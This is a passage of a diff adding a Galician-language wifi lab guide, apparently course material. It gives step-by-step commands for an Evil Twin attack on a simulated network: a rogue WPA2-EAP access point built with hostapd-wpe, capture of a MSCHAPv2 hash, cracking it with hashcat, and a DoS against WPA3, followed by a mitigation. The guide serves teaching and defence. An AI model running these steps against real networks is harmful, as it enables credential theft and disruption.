+</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a><span class="c1"># 4. Executar bootstrap (xera ca.pem, ca.key, server.p12, dh)</span>
+</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a><span class="nb">cd</span><span class="w"> </span><span class="nv">$WPE</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./bootstrap
+</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>
+</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a><span class="c1"># 5. Extraer server.pem e server.key do PKCS#12 xerado por bootstrap</span>
+</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span><span class="nv">$WPE</span>/server.p12<span class="w"> </span>-out<span class="w"> </span><span class="nv">$WPE</span>/server.pem<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a><span class="w">        </span>-nodes<span class="w"> </span>-passin<span class="w"> </span>pass:whatever
+</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span><span class="nv">$WPE</span>/server.p12<span class="w"> </span>-out<span class="w"> </span><span class="nv">$WPE</span>/server.key<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a><span class="w">        </span>-nodes<span class="w"> </span>-nocerts<span class="w"> </span>-passin<span class="w"> </span>pass:whatever
+</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>
+</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>chown<span class="w"> </span>-R<span class="w"> </span>root:root<span class="w"> </span><span class="nv">$WPE</span>
+</span></code></pre></div>
+<p>Verifica que existen os catro ficheiros necesarios:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>ls<span class="w"> </span>/etc/hostapd-wpe/certs/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^ca.pem</span>$<span class="s2">|^server.pem</span>$<span class="s2">|^server.key</span>$<span class="s2">|^dh</span>$<span class="s2">&quot;</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="c1"># Debe amosar: ca.pem  dh  server.key  server.pem</span>
+</span></code></pre></div>
+<hr />
+<h3 id="paso-3-preparar-wlan2-e-crear-configuracion-hostapd-wpe-terminal-2">Paso 3: Preparar wlan2 e crear configuración hostapd-wpe (Terminal 2)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># wlan2 está no namespace global — restaurar modo managed</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="c1"># airmon-ng stop non sempre restaura o modo: hai que forzalo con iw</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlan2mon<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>wlan2<span class="w"> </span>down
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>iw<span class="w"> </span>dev<span class="w"> </span>wlan2<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span>managed
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>macchanger<span class="w"> </span>-r<span class="w"> </span>wlan2
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>wlan2<span class="w"> </span>up
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="c1"># Verificar que está en modo managed antes de continuar</span>
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>iw<span class="w"> </span>dev<span class="w"> </span>wlan2<span class="w"> </span>info<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;type managed&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ERRO: wlan2 non está en modo managed&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="c1"># Crear configuración do Evil Twin WPA2-EAP</span>
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/evil-wpe.conf<span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="s">interface=wlan2</span>
+</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="s">driver=nl80211</span>
+</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="s">ssid=EMPRESA-XYZ</span>
+</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="s">channel=6</span>
+</span><span id="__span-26-18"><a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a><span class="s">hw_mode=g</span>
+</span><span id="__span-26-19"><a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a><span class="s">wpa=2</span>
+</span><span id="__span-26-20"><a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a><span class="s">wpa_key_mgmt=WPA-EAP</span>
+</span><span id="__span-26-21"><a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a><span class="s">wpa_pairwise=CCMP</span>
+</span><span id="__span-26-22"><a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a><span class="s">rsn_pairwise=CCMP</span>
+</span><span id="__span-26-23"><a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a><span class="s">ieee8021x=1</span>
+</span><span id="__span-26-24"><a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a><span class="s">eap_server=1</span>
+</span><span id="__span-26-25"><a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a><span class="s">eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user</span>
+</span><span id="__span-26-26"><a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a><span class="s">ca_cert=/etc/hostapd-wpe/certs/ca.pem</span>
+</span><span id="__span-26-27"><a id="__codelineno-26-27" name="__codelineno-26-27" href="#__codelineno-26-27"></a><span class="s">server_cert=/etc/hostapd-wpe/certs/server.pem</span>
+</span><span id="__span-26-28"><a id="__codelineno-26-28" name="__codelineno-26-28" href="#__codelineno-26-28"></a><span class="s">private_key=/etc/hostapd-wpe/certs/server.key</span>
+</span><span id="__span-26-29"><a id="__codelineno-26-29" name="__codelineno-26-29" href="#__codelineno-26-29"></a><span class="s">dh_file=/etc/hostapd-wpe/certs/dh</span>
+</span><span id="__span-26-30"><a id="__codelineno-26-30" name="__codelineno-26-30" href="#__codelineno-26-30"></a><span class="s">logger_syslog=-1</span>
+</span><span id="__span-26-31"><a id="__codelineno-26-31" name="__codelineno-26-31" href="#__codelineno-26-31"></a><span class="s">logger_syslog_level=2</span>
+</span><span id="__span-26-32"><a id="__codelineno-26-32" name="__codelineno-26-32" href="#__codelineno-26-32"></a><span class="s">logger_stdout=-1</span>
+</span><span id="__span-26-33"><a id="__codelineno-26-33" name="__codelineno-26-33" href="#__codelineno-26-33"></a><span class="s">logger_stdout_level=2</span>
+</span><span id="__span-26-34"><a id="__codelineno-26-34" name="__codelineno-26-34" href="#__codelineno-26-34"></a><span class="s">EOF</span>
+</span></code></pre></div>
+<hr />
+<h3 id="paso-4-lanzar-hostapd-wpe-terminal-2">Paso 4: Lanzar hostapd-wpe (Terminal 2)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>hostapd-wpe<span class="w"> </span>/tmp/evil-wpe.conf<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/tmp/hostapd-wpe.log
+</span></code></pre></div>
+<p>Saída esperada:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Configuration file: /tmp/evil-wpe.conf
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Using interface wlan2 with hwaddr f0:4d:a2:84:3e:2d and ssid &quot;EMPRESA-XYZ&quot;
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>wlan2: interface state UNINITIALIZED-&gt;ENABLED
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>wlan2: AP-ENABLED
+</span></code></pre></div>
+<p><strong>Deixa hostapd-wpe executándose.</strong> Executa no Terminal 3 os pasos seguintes.</p>
+<hr />
+<h3 id="paso-5-reconectar-o-cliente-ao-evil-twin-wpa2-eap-terminal-3">Paso 5: Reconectar o cliente ao Evil Twin WPA2-EAP (Terminal 3)</h3>
+<blockquote>
+<p>⚠️ <strong>Por que o cliente non conecta con só engadir un bloque</strong>: <code>wpa_supplicant</code> ordena os bloques por prioridade interna e tentará SAE/PSK primeiro. Ademais, con dous bloques para o mesmo SSID pode entrar en bucle. A solución é <strong>substituír completamente</strong> o <code>wpa_supplicant.conf</code> por un que só teña o bloque EAP, e relanzar en primeiro plano para ver erros en tempo real.</p>
+</blockquote>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Entrar no namespace do cliente</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>phy1_wlan1<span class="w"> </span>bash
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1"># Parar wpa_supplicant actual</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>pkill<span class="w"> </span>-f<span class="w"> </span>wpa_supplicant<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>sleep<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c1"># Gardar copia do conf orixinal</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="nv">WPA_CONF</span><span class="o">=</span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/wpa_supplicant.conf
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>cp<span class="w"> </span><span class="nv">$WPA_CONF</span><span class="w"> </span><span class="si">${</span><span class="nv">WPA_CONF</span><span class="si">}</span>.bak
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="c1"># Substituír completamente por un conf só WPA-EAP sen ca_cert</span>
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>cat<span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$WPA_CONF</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="s">ctrl_interface=/var/run/wpa_supplicant</span>
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="s">update_config=1</span>
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a><span class="s">network={</span>
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a><span class="s">    ssid=&quot;EMPRESA-XYZ&quot;</span>
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a><span class="s">    key_mgmt=WPA-EAP</span>
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a><span class="s">    eap=PEAP</span>
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a><span class="s">    identity=&quot;ana&quot;</span>
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a><span class="s">    password=&quot;spongebob19&quot;</span>
+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a><span class="s">    phase2=&quot;auth=MSCHAPV2&quot;</span>
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a><span class="s">    ieee80211w=0</span>
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a><span class="s">}</span>
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a><span class="s">EOF</span>
+</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>
+</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a><span class="c1"># Lanzar en primeiro plano para ver a negociación EAP en tempo real</span>
+</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a>wpa_supplicant<span class="w"> </span>-d<span class="w"> </span>-i<span class="w"> </span>wlan1<span class="w"> </span>-c<span class="w"> </span><span class="nv">$WPA_CONF</span>
+</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a><span class="c1"># Ctrl+C cando vexa &quot;CTRL-EVENT-CONNECTED&quot; ou o hash en hostapd-wpe (Terminal 2)</span>
+</span></code></pre></div>
+<p>Saída esperada (fragmento relevante):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>wlan1: SME: Trying to authenticate with &lt;BSSID_wlan2&gt; (SSID=&#39;EMPRESA-XYZ&#39; freq=2437 MHz)
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>wlan1: Trying to associate with &lt;BSSID_wlan2&gt; (SSID=&#39;EMPRESA-XYZ&#39; freq=2437 MHz)
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>wlan1: Associated with &lt;BSSID_wlan2&gt;
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>wlan1: CTRL-EVENT-EAP-STARTED EAP authentication started
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>wlan1: CTRL-EVENT-EAP-METHOD type=25 vendor=0 name=PEAP
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>wlan1: CTRL-EVENT-EAP-METHOD type=26 vendor=0 name=MS-CHAP-V2
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>wlan1: CTRL-EVENT-CONNECTED
+</span></code></pre></div>
+<blockquote>
+<p>💡 <strong>Por que funciona sen <code>ca_cert</code>?</strong> Sen <code>ca_cert</code>, <code>wpa_supplicant</code> acepta calquera certificado TLS — incluíndo o auto-asinado de <code>hostapd-wpe</code>. Se o cliente tivese <code>ca_cert=/ruta/ca.pem</code> rexeitaría o certificado falso e o ataque fallaría.</p>
+<p>🔁 <strong>Restaurar ao rematar</strong>: <code>cp ${WPA_CONF}.bak $WPA_CONF</code></p>
+</blockquote>
+<hr />
+<h3 id="paso-6-verificar-captura-do-hash-en-hostapd-wpe-terminal-2">Paso 6: Verificar captura do hash en hostapd-wpe (Terminal 2)</h3>
+<p>Na Terminal 2 (hostapd-wpe) deberías ver a conexión e o hash MSCHAPv2 capturado en canto o cliente complete a negociación PEAP:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>wlan2: STA 26:9b:26:88:05:fc IEEE 802.1X: Identity received from STA: &#39;ana&#39;
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>mschapv2: Sat Feb 28 14:22:49 2026
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>         username:      ana
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>         challenge:     aa:10:2f:13:87:8b:80:62
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>         response:      8b:74:a2:0e:21:48:9d:da:b4:5d:27:cc:f1:5a:7f:14:88:a9:d0:69:e4:19:e3:84
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>         jtr NETNTLM:           ana:$NETNTLM$aa102f13878b8062$8b74a20e21489ddab45d27ccf15a7f1488a9d069e419e384
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>         hashcat NETNTLM:       ana::::8b74a20e21489ddab45d27ccf15a7f1488a9d069e419e384:aa102f13878b8062
+</span></code></pre></div>
+<p>O que ver aquí é:<br />
+- <code>username</code>: identidade enviada polo cliente durante a fase EAP (Identity).<br />
+- <code>challenge</code>: valor aleatorio enviado polo servidor EAP ao cliente.<br />
+- <code>response</code>: hash que o cliente calcula aplicando MSCHAPv2 ao challenge usando o seu contrasinal real.<br />
+- As liñas <code>jtr</code> e <code>hashcat</code> son formatos directamente usables polas ferramentas de cracking.</p>
+<p>Preme <code>Ctrl+C</code> para deter <code>hostapd-wpe</code> e recuperar o prompt. Agora extraemos e crackeamos o hash:</p>
+<p><strong>Se o cliente se asocia pero non aparece o hash</strong> (só ves <code>authenticated</code> e <code>associated</code> pero non <code>mana_wpe:</code>), o PEAP non chegou a negociarse. Comproba o log de <code>wpa_supplicant</code> (Terminal 3) — busca erros EAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># En Terminal 3 (mentres wpa_supplicant corre en primeiro plano)</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="c1"># Busca estas liñas problemáticas:</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="c1"># EAP: Failed to initialize EAP method: vendor 0 method 25 (PEAP)</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c1"># → O wpa_supplicant non ten soporte PEAP compilado (raro en Kali)</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="c1"># EAP: server certificate verification failed</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c1"># → O cliente ten ca_cert configurado nalgún sitio (verifica o conf)</span>
+</span></code></pre></div>
+<p><strong>Se o cliente non se asocia en absoluto</strong>, verifica que <code>wlan2</code> (Evil Twin) é visible desde o namespace do cliente:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Nunha cuarta terminal</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>phy1_wlan1<span class="w"> </span>iw<span class="w"> </span>dev<span class="w"> </span>wlan1<span class="w"> </span>scan<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A5<span class="w"> </span><span class="s2">&quot;EMPRESA-XYZ&quot;</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="c1"># Debe aparecer dúas entradas: BSSID do AP lexítimo (caído) e BSSID de wlan2 (Evil Twin EAP)</span>
+</span></code></pre></div>
+<hr />
+<h3 id="paso-7-extraer-o-hash-para-hascat-terminal-1">Paso 7: Extraer o hash para hascat (Terminal 1)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>grep<span class="w"> </span><span class="s2">&quot;hashcat NETNTLM&quot;</span><span class="w"> </span>/tmp/hostapd-wpe.log<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $3}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>evil-hash.txt
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>cat<span class="w"> </span>evil-hash.txt
+</span></code></pre></div>
+<p>Debe mostrar unha liña no formato: <code>ana::::&lt;response&gt;:&lt;challenge&gt;</code></p>
+<h3 id="paso-8-crackear-con-hashcat-modo-5500-netntlmv1">Paso 8: Crackear con hashcat (<a href="../../../apuntamentos/modo-5500/" target="_blank&quot;">Modo 5500 — NetNTLMv1</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>gunzip<span class="w"> </span>-c<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz<span class="w"> </span>&gt;<span class="w"> </span>/tmp/rockyou.txt
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5500</span><span class="w"> </span>evil-hash.txt<span class="w"> </span>/tmp/rockyou.txt
+</span></code></pre></div>
+<p>O modo <code>5500</code> é específico para hashes NetNTLMv1 / NetNTLMv1+ESS, que é o formato que xera MSCHAPv2. O resultado esperado é:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>ana::::8b74a20e21489ddab45d27ccf15a7f1488a9d069e419e384:aa102f13878b8062:spongebob19
+</span></code></pre></div>
+<p><strong>✅ Contrasinal capturado: <code>spongebob19</code></strong></p>
+<h3 id="paso-9-mostrar-o-resultado">Paso 9: Mostrar o resultado</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5500</span><span class="w"> </span>evil-hash.txt<span class="w"> </span>/tmp/rockyou.txt<span class="w"> </span>--show
+</span></code></pre></div>
+<hr />
+<h3 id="comparativa-de-variantes-evil-twin">Comparativa de variantes Evil Twin</h3>
+<table>
+<thead>
+<tr>
+<th>Variante Evil Twin</th>
+<th>Ferramenta cracking</th>
+<th>Requere</th>
+<th>Resultado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WPA2-<strong>PSK</strong> (<code>wlan3</code>)</td>
+<td><code>aircrack-ng</code></td>
+<td>Handshake WPA2-PSK</td>
+<td>Contrasinal directo</td>
+</tr>
+<tr>
+<td>WPA2-<strong>EAP</strong> (<code>wlan2</code>, wpe)</td>
+<td><code>jtr|hashcat</code></td>
+<td>Hash MSCHAPv2 + sen <code>ca_cert</code></td>
+<td>Contrasinal directo</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-resumo-do-ataque-dos-evil-twin-wpa2-pskeap">7. Resumo do Ataque (DoS + Evil Twin WPA2-PSK(EAP))</h2>
+<p>O ataque combinado desta práctica demostra como un cliente WPA3 con modo transición habilitado é vulnerable:</p>
+<table>
+<thead>
+<tr>
+<th>Paso</th>
+<th>Técnica</th>
+<th>Ferramenta</th>
+<th>Resultado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Recoñecemento</td>
+<td><code>airodump-ng</code></td>
+<td>BSSID AP lexítimo + MAC cliente</td>
+</tr>
+<tr>
+<td>2</td>
+<td>DoS contra AP WPA3 lexítimo</td>
+<td><code>dragondrain</code></td>
+<td>AP lexítimo caído</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Reconexión ao Evil Twin WPA2</td>
+<td><code>wpa_supplicant</code></td>
+<td>Handshake WPA2-PSK capturado</td>
+</tr>
+<tr>
+<td>4a</td>
+<td>Cracking handshake PSK offline</td>
+<td><code>aircrack-ng</code></td>
+<td>Contrasinal recuperado (<code>spongebob19</code>)</td>
+</tr>
+<tr>
+<td>4b</td>
+<td>Captura hash MSCHAPv2 (EAP)</td>
+<td><code>hostapd-wpe</code></td>
+<td>Hash MSCHAPv2 capturado</td>
+</tr>
+<tr>
+<td>4c</td>
+<td>Cracking hash MSCHAPv2</td>
+<td><code>jtr|hashcat</code></td>
+<td>Contrasinal recuperado (<code>spongebob19</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Por que funciona:</strong> O cliente ten <code>key_mgmt=WPA-PSK SAE</code> ou <code>key_mgmt=WPA-EAP SAE</code> (modo transición) e acepta conectar ao Evil Twin WPA2-PSK cando o AP lexítimo non está dispoñible.</p>
+<p><strong>Mitigación:</strong> Configurar o AP en modo <strong>WPA3-only</strong> (<code>wpa_key_mgmt=SAE</code> unicamente, sen <code>WPA-PSK</code> ou <code>WPA-EAP</code>) e o cliente con <code>key_mgmt=SAE</code> exclusivamente. Así non hai downgrade posible.</p>
+<hr />
